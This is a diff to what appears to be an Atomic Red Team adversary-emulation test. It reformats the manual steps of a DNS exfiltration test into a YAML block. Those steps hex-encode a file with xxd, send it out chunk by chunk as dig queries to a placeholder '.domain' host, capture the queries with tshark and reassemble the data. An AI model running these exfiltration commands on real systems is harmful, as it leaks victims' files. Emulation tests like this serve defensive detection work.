@@ -54,5 +54,16 @@ atomic_tests:
   supported_platforms:
   - linux
   executor:
-    steps: "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \".domain\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n    \n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n"
+    steps: |
+      1. On the adversary machine run the below command.
+
+          tshark -f "udp port 53" -Y "dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches ".domain"" >> received_data.txt
+
+      2. On the victim machine run the below commands.
+
+          xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done
+          
+      3. Once the data is received, use the below command to recover the data.
+      
+          cat output_file | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r
     name: manual
